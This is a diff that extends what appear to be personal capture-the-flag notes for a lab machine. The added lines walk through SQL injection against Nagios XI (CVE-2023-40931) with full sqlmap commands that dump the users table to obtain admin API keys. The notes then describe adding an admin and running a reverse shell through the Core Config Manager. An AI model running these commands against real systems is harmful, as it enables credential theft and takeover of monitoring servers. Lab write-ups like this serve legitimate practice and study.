@@ -116,7 +116,17 @@ inner network email phishing
 7. find Nagios XI version 5.11.0. (CVE-2023-40931)
   (https://rootsecdev.medium.com/notes-from-the-field-exploiting-nagios-xi-sql-injection-cve-2023-40931-9d5dd6563f8c)
 8. exploit by sqlmap: sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --batch -p id --cookie="nagiosxi=gmmapc26k5sr7pbm1emj9u4cmc" --dbs --threads=10
-9. 
+  (find 2 dbs, "nagiosxi" one is interesting)
+9. cmd: sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --batch -p id --cookie="nagiosxi=gmmapc26k5sr7pbm1emj9u4cmc" -D nagiosxi --tables
+  (find many tables, "xi_users" is interesting)
+10. cmd: sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --batch -p id --cookie="nagiosxi=gmmapc26k5sr7pbm1emj9u4cmc" -D nagiosxi -T xi_users --dump
+  (dump xi_users table, and find api keys of "admin")
+11. exploit https://www.exploit-db.com/exploits/44969 manually, from the step after getting api key.
+    (same as manually do add_admin() function.)
+12. manually create commands in "Core Config Manager", which is a reverse shell. goto localhost -> run this command.
+    (same as execute_cmdstager() in https://www.exploit-db.com/exploits/44969, check how it works later.)
+13. get user "nagios"
+14. 
 
 
 ```
